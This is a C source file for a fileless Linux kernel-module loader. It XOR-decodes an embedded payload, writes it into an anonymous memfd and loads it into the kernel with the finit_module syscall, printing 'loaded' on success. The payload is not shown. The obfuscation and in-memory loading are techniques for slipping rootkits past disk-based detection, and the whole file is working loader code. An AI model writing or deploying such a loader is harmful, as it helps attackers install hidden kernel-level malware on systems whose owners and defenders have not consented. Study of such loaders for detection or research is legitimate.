#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include "load.h"

extern bin_data_t data;

static inline long FinitMod(int fd, const char *param_values, int flags);
static void Deobfuscate(unsigned char *out, const unsigned char *in, unsigned int len);
int LoadFromMemory(const char *params, int flags);

int main(void)
{
    int exit_code = EXIT_FAILURE;

    if (!LoadFromMemory(NULL, 0))
    {

        exit_code = EXIT_SUCCESS;
        printf("loaded\n");
    }
    else
    {
        printf("an error occured\n");
    }

    return exit_code;
}

int LoadFromMemory(const char *params, int flags)
{
    int exit_code = -1;
    int memfd = -1;
    unsigned char *decoded_payload = NULL;
    ssize_t written = -1;
    long ret = -1;

    if (data.len == 0)
    {
        goto end;
    }

    memfd = memfd_create("kmod_em", MFD_CLOEXEC);
    if (memfd < 0)
    {
        perror("memfd");
        goto end;
    }

    decoded_payload = malloc(data.len);
    if (!decoded_payload)
    {
        goto end;
    }

    Deobfuscate(decoded_payload, data.payload, data.len);

    written = write(memfd, decoded_payload, data.len);
    if (written < 0 || (uint64_t)written != data.len)
    {
        goto end;
    }

    if (lseek(memfd, 0, SEEK_SET) < 0)
    {
        goto end;
    }

    ret = FinitMod(memfd, params ? params : "", flags);
    if (ret != 0)
    {
        perror("finit");
        goto end;
    }

    exit_code = 0;

end:
    if (decoded_payload)
    {
        free(decoded_payload);
    }

    if (memfd >= 0)
    {
        close(memfd);
    }

    return exit_code;
}

static inline long FinitMod(int fd, const char *param_values, int flags)
{
    return syscall(SYS_finit_module, fd, param_values, flags);
}

static void Deobfuscate(unsigned char *out, const unsigned char *in, unsigned int len)
{
    for (unsigned int i = 0; i < len; i++)
    {
        out[i] = in[i] ^ XOR_KEY;
    }
}